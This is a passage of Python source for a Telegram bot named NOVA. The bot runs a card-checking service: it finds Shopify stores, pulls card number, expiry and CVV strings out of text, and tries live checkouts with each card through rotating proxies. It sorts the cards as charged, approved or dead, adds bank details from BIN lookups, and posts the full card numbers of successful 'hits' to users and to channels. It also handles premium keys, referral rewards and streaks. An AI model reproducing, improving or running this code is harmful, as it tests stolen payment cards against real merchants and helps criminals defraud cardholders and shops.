                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/markdown, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://shop.app/",
            })
            with urllib.request.urlopen(req, timeout=20) as r:
                body = r.read().decode("utf-8", errors="replace")
            items = _parse_shop_markdown(body)
            if items:
                return items
        except Exception:
            continue
    return []


def discover_shopify_stores(keyword="", want=200):
    kw_list = []
    if keyword:
        kw_list.append(keyword)
    random.shuffle(AUTO_KEYWORDS)
    kw_list.extend(AUTO_KEYWORDS[:12])
    seen_sites = set()
    out = []
    for kw in kw_list:
        if len(out) >= want:
            break
        try:
            items = _shop_search_once(kw)
        except Exception as e:
            log_system("FETCH", f"{kw}: {e}", "error")
            continue
        for it in items:
            key = it["site"].lower()
            if key in seen_sites:
                continue
            seen_sites.add(key)
            out.append(it)
            if len(out) >= want:
                break
    return out


async def discover_shopify_stores_async(keyword="", want=200):
    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_ENGINE_POOL, discover_shopify_stores, keyword, want),
            timeout=60)
    except Exception:
        return []


# ====================== PROXY PARSING ======================
_COUNTRY_CODES = {
    'US','CA','MX','BR','AR','CL','CO','PE','VE','EC','UY','PY','BO',
    'GB','IE','DE','FR','IT','ES','PT','NL','BE','CH','AT','SE','NO',
    'DK','FI','PL','CZ','HU','RO','GR','RU','UA','TR',
    'AE','SA','QA','KW','BH','OM','JO','LB','IL','EG','MA','DZ','TN',
    'ZA','NG','KE','IN','PK','BD','LK','NP','CN','HK','TW','JP','KR',
    'TH','VN','PH','MY','SG','ID','AU','NZ','FJ',
}


def _parse_proxy_country(proxy_line):
    if not proxy_line:
        return ""
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    m = re.search(r'[|#]([A-Z]{2})$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    return ""


def _strip_country_from_proxy(proxy_line):
    if not proxy_line:
        return proxy_line
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(2)
    m = re.search(r'^(.+?)[|#]([A-Z]{2})$', p)
    if m and m.group(2) in _COUNTRY_CODES:
        return m.group(1)
    return p


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt,
            'proxy_url': (f"{pt}://{u}:{pw}@{h}:{p}" if u and pw else f"{pt}://{h}:{p}")}


def proxy_to_url(proxy):
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    return p['proxy_url']


# ====================== URL HELPERS ======================
def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urllib.parse.urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def extract_urls(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


# ====================== HTTP SESSIONS ======================
_GLOBAL_HTTP = None
_GLOBAL_BIN = None
_GLOBAL_PROXY = None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=10),
            connector=aiohttp.TCPConnector(limit=500, limit_per_host=200,
                                            ttl_dns_cache=600, use_dns_cache=True,
                                            enable_cleanup_closed=True))
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300))
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30, connect=20),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300))
    return _GLOBAL_PROXY


# ====================== PER-USER SEMAPHORES ======================
_USER_SEMS = {}


def get_user_sem(uid, t="msp"):
    key = (uid, t)
    sem = _USER_SEMS.get(key)
    if sem is None:
        limits = {
            "sp": SP_PER_USER_WORKERS, "msp": MSP_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS, "site": SITE_PER_USER_WORKERS,
            "fetch": FETCH_PER_USER_WORKERS,
        }
        sem = asyncio.Semaphore(limits.get(t, 20))
        _USER_SEMS[key] = sem
    return sem


def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k[0] == uid]:
        _USER_SEMS.pop(k, None)


# ====================== BIN LOOKUP ======================
_BIN_CACHE = {}


async def get_bin_info(card_number):
    cn = card_number[:6] if card_number else ''
    if not cn or len(cn) < 6:
        return ('-', '-', '-', '-', '-', '')
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    try:
        s = await get_bin_session()
        async with s.get(f"https://lookup.binlist.net/{cn}",
                         headers={'Accept-Version': '3'}) as resp:
            if resp.status == 200:
                d = await resp.json(content_type=None)
                scheme = d.get('scheme', '-') or '-'
                typ = d.get('type', '-') or '-'
                brand = d.get('brand', '-') or '-'
                bank = (d.get('bank') or {}).get('name', '-') or '-'
                country = (d.get('country') or {}).get('name', '-') or '-'
                flag = (d.get('country') or {}).get('emoji', '') or ''
                r = (scheme.upper(), typ.upper(), brand.upper(), bank, country, flag)
                _BIN_CACHE[cn] = r
                return r
    except Exception:
        pass
    return ('-', '-', '-', '-', '-', '')


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n💎 <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        u = time.time() - BOT_START_TIME
        h, m, s = int(u // 3600), int((u % 3600) // 60), int(u % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
💻 CPU: <code>{cpu}%</code>
🧠 RAM: <code>{mem.percent}%</code> ({mem.used // (1024**2)}MB / {mem.total // (1024**2)}MB)
💾 Disk: <code>{disk.percent}%</code>
⏰ Uptime: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


# ====================== REFERRALS (JSON) ======================
def load_referrals():
    data = _read_json(REFERRALS_FILE, None)
    if not isinstance(data, dict):
        data = {"users": {}, "codes": {}}
    data.setdefault("users", {}); data.setdefault("codes", {})
    return data


def save_referrals(data):
    _write_json(REFERRALS_FILE, data)


def _gen_ref_code(user_id):
    base = f"NOVA{user_id}{time.time()}{random.random()}"
    return "NOVA" + hashlib.sha1(base.encode()).hexdigest().upper()[:6]


def get_or_create_ref_code(user_id):
    uid = str(user_id); data = load_referrals()
    u = data["users"].get(uid)
    if u and u.get("code"):
        return u["code"]
    code = _gen_ref_code(user_id)
    while code in data["codes"]:
        code = _gen_ref_code(user_id + random.randint(1, 9999999))
    data["users"][uid] = {"code": code, "referred_by": None,
                          "referrals": [], "pending": [], "rewarded": [],
                          "milestones_paid": 0, "total_hours_earned": 0,
                          "total_cc_upgrades": 0,
                          "created_at": datetime.now().isoformat()}
    data["codes"][code] = uid
    save_referrals(data)
    return code


def find_user_by_code(code):
    data = load_referrals()
    uid = data["codes"].get((code or "").upper().strip())
    return int(uid) if uid else None


def attach_referral(new_user_id, ref_code):
    if not ref_code:
        return False
    inviter_id = find_user_by_code(ref_code)
    if not inviter_id or inviter_id == new_user_id:
        return False
    data = load_referrals()
    new_uid = str(new_user_id); inv_uid = str(inviter_id)
    if new_uid in data["users"] and data["users"][new_uid].get("referred_by"):
        return False
    if new_uid not in data["users"]:
        save_referrals(data); get_or_create_ref_code(new_user_id); data = load_referrals()
    if inv_uid not in data["users"]:
        save_referrals(data); get_or_create_ref_code(inviter_id); data = load_referrals()
    data["users"][new_uid]["referred_by"] = inviter_id
    inviter = data["users"][inv_uid]
    if new_user_id not in inviter.get("pending", []):
        inviter.setdefault("pending", []).append(new_user_id)
    save_referrals(data)
    return True


async def _grant_milestone(user_id, hours, cc_limit):
    """Extends user's premium expiry in Mongo."""
    if user_id in ADMIN_ID:
        return
    info = await mongo_db["users"].find_one({"user_id": user_id})
    if not info:
        return
    plan = info.get("plan", "Bronze")
    if plan not in ["Core", "Elite", "Root", "X"]:
        return
    exp = info.get("expiry")
    base_ts = datetime.utcnow()
    if exp and exp > base_ts:
        base_ts = exp
    new_exp = base_ts + timedelta(hours=hours)
    await mongo_db["users"].update_one(
        {"user_id": user_id},
        {"$set": {"expiry": new_exp}}
    )


def maybe_pay_milestone(new_user_id):
    if REFERRAL_MIN_CHECKS > 0 and count_successful_checks(new_user_id) < REFERRAL_MIN_CHECKS:
        return None
    data = load_referrals()
    new_uid = str(new_user_id)
    u = data["users"].get(new_uid)
    if not u:
        return None
    inviter_id = u.get("referred_by")
    if not inviter_id:
        return None
    inv_uid = str(inviter_id)
    inviter = data["users"].get(inv_uid)
    if not inviter:
        return None
    pending = inviter.get("pending", [])
    rewarded = inviter.get("rewarded", [])
    if new_user_id in rewarded or new_user_id not in pending:
        return None
    inviter["pending"] = [x for x in pending if x != new_user_id]
    inviter.setdefault("rewarded", []).append(new_user_id)
    inviter.setdefault("referrals", []).append(new_user_id)
    inviter["referrals"] = list(dict.fromkeys(inviter["referrals"]))
    total = len(inviter["rewarded"])
    if total > REFERRAL_MAX_PER_USER:
        save_referrals(data); return None
    every = REFERRAL_MILESTONE_EVERY
    paid = int(inviter.get("milestones_paid", 0))
    due = total // every
    fired = False
    if due > paid:
        inviter["milestones_paid"] = paid + 1
        inviter["total_hours_earned"] = int(inviter.get("total_hours_earned", 0)) + REFERRAL_MILESTONE_HOURS
        inviter["total_cc_upgrades"] = int(inviter.get("total_cc_upgrades", 0)) + 1
        fired = True
    save_referrals(data)
    if fired:
        return {"inviter_id": inviter_id, "hours": REFERRAL_MILESTONE_HOURS,
                "cc_limit": REFERRAL_MILESTONE_CC_LIMIT, "total_confirmed": total,
                "milestones_paid": inviter["milestones_paid"],
                "next_milestone_at": (inviter["milestones_paid"] + 1) * every}
    return None


def referral_stats(user_id):
    get_or_create_ref_code(user_id)
    data = load_referrals()
    u = data["users"].get(str(user_id), {})
    confirmed = len(u.get("rewarded", []))
    pending = len(u.get("pending", []))
    every = REFERRAL_MILESTONE_EVERY
    paid = int(u.get("milestones_paid", 0))
    to_next = (every - (confirmed % every)) if (confirmed % every) else every
    return {"code": u.get("code", ""), "confirmed": confirmed, "pending": pending,
            "total": confirmed + pending, "milestones_paid": paid,
            "next_milestone_in": to_next,
            "total_hours": int(u.get("total_hours_earned", 0)),
            "cc_upgrades": int(u.get("total_cc_upgrades", 0)),
            "referred_by": u.get("referred_by")}


def reset_referrals_for_user(user_id):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data["users"]:
        return False
    u = data["users"][uid]
    u["pending"] = []; u["rewarded"] = []; u["referrals"] = []
    u["milestones_paid"] = 0; u["total_hours_earned"] = 0
    u["total_cc_upgrades"] = 0
    save_referrals(data)
    return True


# ====================== STREAK (JSON) ======================
def load_streaks():
    data = _read_json(STREAKS_FILE, None)
    return data if isinstance(data, dict) else {}


def save_streaks(data):
    _write_json(STREAKS_FILE, data)


def _today_str():
    return datetime.now().strftime("%Y-%m-%d")


def _yesterday_str():
    return (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")


def update_streak(user_id):
    data = load_streaks()
    uid = str(user_id); now = datetime.now()
    e = data.get(uid) or {"current": 0, "best": 0, "last_date": None,
                           "last_ts": 0, "total_checks": 0, "milestones_claimed": []}
    e["total_checks"] = int(e.get("total_checks", 0)) + 1
    today = _today_str(); yest = _yesterday_str()
    ld = e.get("last_date"); lt = float(e.get("last_ts", 0) or 0)
    hs = (now.timestamp() - lt) / 3600.0 if lt else 999
    reward_info = None
    if ld == today:
        pass
    elif ld == yest and hs <= STREAK_MAX_GAP_HOURS:
        e["current"] = int(e.get("current", 0)) + 1
    elif hs < STREAK_MIN_GAP_HOURS and ld != today:
        pass
    else:
        e["current"] = 1
    if e["current"] > int(e.get("best", 0)):
        e["best"] = e["current"]
    e["last_date"] = today; e["last_ts"] = now.timestamp()
    cur = e["current"]
    if cur in STREAK_MILESTONES and cur not in e.get("milestones_claimed", []):
        bonus_h = STREAK_MILESTONES[cur]
        e.setdefault("milestones_claimed", []).append(cur)
        reward_info = {"day": cur, "hours": bonus_h}
    data[uid] = e; save_streaks(data)
    return {"current": e["current"], "best": e["best"],
            "total_checks": e["total_checks"], "reward": reward_info}


def get_streak(user_id):
    data = load_streaks()
    e = data.get(str(user_id)) or {}
    return {"current": int(e.get("current", 0)),
            "best": int(e.get("best", 0)),
            "last_date": e.get("last_date"),
            "total_checks": int(e.get("total_checks", 0)),
            "milestones": e.get("milestones_claimed", [])}


# ====================== ENGINE WRAPPER ======================
async def check_card_direct(card: str, site: str, proxy: str):
    if not ENGINE_OK:
        return {"status": "Error", "message": f"engine missing: {_ENGINE_ERR}",
                "card": card, "site": site, "gateway": "Shopify",
                "price": "-", "price_value": 0.0,
                "proxy": proxy, "status_code": "ENGINE_MISSING",
                "retryable": False}, proxy

    proxy_clean = _strip_country_from_proxy(proxy) if proxy else ""
    proxy_url = ""
    if proxy_clean:
        try:
            proxy_url = engine_normalize_proxy(proxy_clean)
        except Exception as e:
            return {"status": "Error", "message": f"proxy: {e}",
                    "card": card, "site": site, "gateway": "Shopify",
                    "price": "-", "price_value": 0.0,
                    "proxy": proxy, "status_code": "PROXY_INVALID",
                    "retryable": True}, proxy

    site_clean = site.rstrip("/")
    if not site_clean.startswith(("http://", "https://")):
        site_clean = "https://" + site_clean

    loop = asyncio.get_running_loop()

    def _run():
        return run_checkout_for_card(site_clean, card, proxy_url, True)

    try:
        res = await asyncio.wait_for(
            loop.run_in_executor(_ENGINE_POOL, _run),
            timeout=CHECK_TIMEOUT)
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "hard-timeout",
                "card": card, "site": site, "gateway": "Shopify",
                "price": "-", "price_value": 0.0, "proxy": proxy,
                "status_code": "TIMEOUT", "retryable": True}, proxy
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"status": "Error", "message": str(e)[:140],
                "card": card, "site": site, "gateway": "Shopify",
                "price": "-", "price_value": 0.0, "proxy": proxy,
                "status_code": "EXCEPTION", "retryable": True}, proxy

    name = res.status.name
    if name == "CHARGED":
        status = "Charged"
    elif name == "APPROVED":
        status = "Approved"
    elif name == "DECLINED":
        status = "Dead"
    else:
        status = "Error"

    price_str = res.amount or "-"
    try:
        price_val = float(res.amount) if res.amount else 0.0
    except Exception:
        price_val = 0.0

    return {
        "status": status,
        "message": (res.status_code or (str(res.error)[:100] if res.error else "N/A")),
        "card": card, "site": site, "gateway": "Shopify",
        "price": price_str, "price_value": price_val,
        "proxy": proxy, "status_code": res.status_code or status.upper(),
        "retryable": bool(res.retryable),
        "receipt_url": res.receipt_url or "",
    }, proxy


async def check_card_with_retry(card, sites, proxies, max_retries=2, rotator=None):
    if not sites:
        return {"status": "Error", "message": "No sites", "card": card,
                "gateway": "Shopify", "price": "-", "price_value": 0.0,
                "retryable": False}, None
    if not proxies:
        return {"status": "Error", "message": "No proxies", "card": card,
                "gateway": "Shopify", "price": "-", "price_value": 0.0,
                "retryable": False}, None

    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    ranked = _get_active_sites(sites)
    if ranked:
        sites = ranked

    for attempt in range(max_retries):
        site = rotator.pick_site(sites, exclude=tried_sites)
        if not site:
            tried_sites.clear(); site = rotator.pick_site(sites)
        if not site:
            break
        tried_sites.add(site)

        proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used = await check_card_direct(card, site, proxy)
        last_proxy = used or last_proxy
        last_result = result

        status = result.get("status", "Dead")
        retryable = result.get("retryable", False)
        try:
            _site_report(site, status)
        except Exception:
            pass

        if status in ("Charged", "Approved"):
            return result, last_proxy
        if status == "Dead" and not retryable:
            return result, last_proxy

        await asyncio.sleep(0)

    return last_result or {"status": "Error", "message": "All attempts failed",
                           "card": card, "gateway": "Shopify",
                           "price": "-", "price_value": 0.0,
                           "retryable": True}, last_proxy


class SmartRotator:
    def __init__(self):
        self._sf, self._pf = {}, {}

    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        avail = [s for s in sites if s not in exclude] or sites
        return random.choice(avail) if avail else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        avail = [p for p in proxies if p not in exclude] or proxies
        return random.choice(avail) if avail else None


# ====================== PROXY TEST ======================
async def test_proxy(proxy):
    proxy_url = proxy_to_url(proxy)
    session = await get_proxy_session()
    try:
        async with session.get(
            "https://cdn.shopify.com/",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=10, connect=6),
            allow_redirects=False,
        ) as r:
            if r.status in (200, 301, 302, 401, 403, 404):
                ip = '?'
                try:
                    async with session.get('https://api.ipify.org?format=json',
                                            proxy=proxy_url,
                                            timeout=aiohttp.ClientTimeout(total=6, connect=4)) as ir:
                        if ir.status == 200:
                            d = await ir.json(content_type=None)
                            ip = d.get('ip', '?')
                except Exception:
                    pass
                return {'proxy': proxy, 'status': 'alive', 'ip': ip}
            if r.status == 407:
                return {'proxy': proxy, 'status': 'dead',
                        'reason': 'proxy auth required (407)'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead',
                'reason': f'{type(e).__name__}: {str(e)[:60]}'}
    return {'proxy': proxy, 'status': 'dead', 'reason': 'no Shopify reachability'}


# ====================== CARD FORMAT ======================
def _bin_lines(bin_tuple):
    b, t, l, bank, c, flag = bin_tuple
    return (f"{bs('BIN')} ━ <code>{b} - {t} - {l}</code>\n"
            f"{bs('Bank')} ━ <code>{bank}</code>\n"
            f"{bs('Country')} ━ <code>{c} {flag}</code>")


def _status_header(status):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"🥇 <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"🥈 <b>{bs('APPROVED')}</b>"
    if s == 'DECLINED': return f"🥔 <b>{bs('DECLINED')}</b>"
    if s == 'ERROR':    return f"🧨 <b>{bs('ERROR')}</b>"
    return f"⚪ <b>{bs(s or 'UNKNOWN')}</b>"


def format_single(result, bin_tuple, elapsed):
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result, bin_tuple):
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


HIT_BUTTON = [[pbtn(bs("💎 NOVA"), url="http://t.me/spectrumxchkbot",
                    style="primary", icon="💎")]]


async def send_realtime_hit(user_id, result, video_path=None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    status = (result.get('status') or 'Dead').upper()
    text = format_realtime_hit(result, bin_tuple)
    if status == "CHARGED":
        text = pe(f"📌 <b>{bs('PINNED HIT — CHARGED')}</b>\n{text}")
    video_path = video_path or _pick_hit_video()
    try:
        sent = None
        if video_path and os.path.exists(video_path):
            sent = await send_file_entities(user_id, video_path, text,
                                             buttons=HIT_BUTTON, supports_streaming=True)
        if sent is None:
            sent = await send_entities(user_id, text, buttons=HIT_BUTTON)
        if status == "CHARGED" and sent:
            try:
                await client_instance.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


async def send_hit_to_channel(card, status, response, gateway, price="-",
                              user_mention=None, user_id=None, site=None,
                              proxy_used=None, video_path=None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED"):
        return
    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
⊀ {bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{(response or '')[:45]}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")
            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(HIT_CHANNEL_ID, video_path, body,
                                                     buttons=HIT_BUTTON,
                                                     supports_streaming=True)
                except Exception:
                    pass
            if sent is None:
                sent = await send_entities(HIT_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(HIT_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"{e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            b, t, l, bank, c, flag = bin_tuple
            bin_disp = f"{b} - {t} - {l}" if b != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{c} {flag}" if c != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            body = pe(f"""{PE} {bs(status_up)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")
            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(CHARGED_ONLY_CHANNEL_ID, video_path, body,
                                                     buttons=HIT_BUTTON,
                                                     supports_streaming=True)
                except Exception:
                    pass
            if sent is None:
                sent = await send_entities(CHARGED_ONLY_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(CHARGED_ONLY_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"{e}", "error")


# ====================== REDEEM LOG ======================
async def send_redeem_log(user_id, key, status, details=""):
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"
    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS
    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h, exp_m = exp_mins // 60, exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"
    ok = status.startswith("✅")
    emoji = "✅" if ok else "❌"
    body = pe(f"""{emoji} <b>{bs('Redeem Log')}</b> ➛ <b>{bs(status)}</b>
{SEP}
👤 <b>{bs('User')}</b> ⌁ {username} ⌁ <code>{user_id}</code>
🔑 <b>{bs('Key')}</b> ⌁ <code>{key}</code>
💎 <b>{bs('Plan')}</b> ⌁ <code>{plan_disp}</code>
⏰ <b>{bs('Expires')}</b> ⌁ <code>{exp_disp}</code>
📝 <b>{bs('Details')}</b> ⌁ <i>{details or '-'}</i>
{SEP}
{DEV_LINE}""")
    try:
        await send_entities(REDEEM_LOG_CHANNEL_ID, body, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("REDEEM_LOG", f"{e}", "error")


# ====================== FREE GATE ======================
async def _check_free_or_premium(event, uid):
    if uid in ADMIN_ID:
        return True
    if await is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
💎 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                           style="success", icon="📩")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


async def _consume_free(uid):
    if uid in ADMIN_ID or await is_premium(uid):
        return
    set_free_last(uid); inc_free_usage(uid)


# ====================== MILESTONE / STREAK PAYOUTS ======================
async def _process_milestone_payout(user_id):
    try:
        info = maybe_pay_milestone(user_id)
        if not info:
            return
        await _grant_milestone(info["inviter_id"], info["hours"], info["cc_limit"])
        try:
            await send_entities(info["inviter_id"], pe(
                f"🎉 <b>{bs('Milestone Unlocked!')}</b>\n{SEP}\n"
                f"👥 {bs('Confirmed referrals')}: <code>{info['total_confirmed']}</code>\n"
                f"🎁 {bs('Reward')}: <code>+{info['hours']}h Premium</code>\n"
                f"💳 {bs('CC limit')}: <code>{info['cc_limit']}</code>\n"
                f"🏅 {bs('Milestones earned')}: <code>{info['milestones_paid']}</code>\n"
                f"🎯 {bs('Next at')}: <code>{info['next_milestone_at']}</code> referrals"))
        except Exception:
            pass
    except Exception as e:
        log_system("REFERRAL", f"milestone error: {e}", "error")


async def _process_streak_update(user_id):
    try:
        info = update_streak(user_id)
        r = info.get("reward")
        if not r:
            return
        await _grant_milestone(user_id, r["hours"], 0)
